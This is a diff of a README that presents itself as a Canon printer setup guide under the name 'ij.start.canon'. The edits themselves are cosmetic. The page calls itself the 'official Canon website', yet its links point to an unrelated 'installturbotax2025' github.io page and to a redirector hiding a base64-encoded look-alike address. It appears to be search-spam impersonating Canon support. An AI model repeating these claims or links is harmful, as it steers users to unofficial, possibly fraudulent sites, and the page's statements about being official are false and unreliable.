@@ -1,4 +1,8 @@
+<div align="center">
+
 # ij.start.canon
+
+</div>
 
 <div align="center">
   <a href="https://ww0.us/?aHR0cHM6Ly9pai1zdGFydC1jYW5vbi1wcmludGVyLmdpdGh1Yi5pbw==">
@@ -8,11 +12,13 @@
 
 Setting up your Canon printer is quick and easy with **[ij.start.canon](https://installturbotax2025.github.io/)**. This official Canon website allows you to download drivers, install printer software, and configure your device for seamless printing. Follow this guide to complete your Canon printer setup.
 
+
 <div align="center">
   <a href="https://ij-start-canon-printer.github.io/">
-    <img src="5092292.jpg" alt="ij.start.canon" title="ij.start.canon">
+    <img src="5092292.jpg" alt="ij.start.canon" title="ij.start.canon" width="400" height="300">
   </a>
 </div>
+
 
 ## How do I Set Up Your Canon Printer using IJ.start Canon?
 
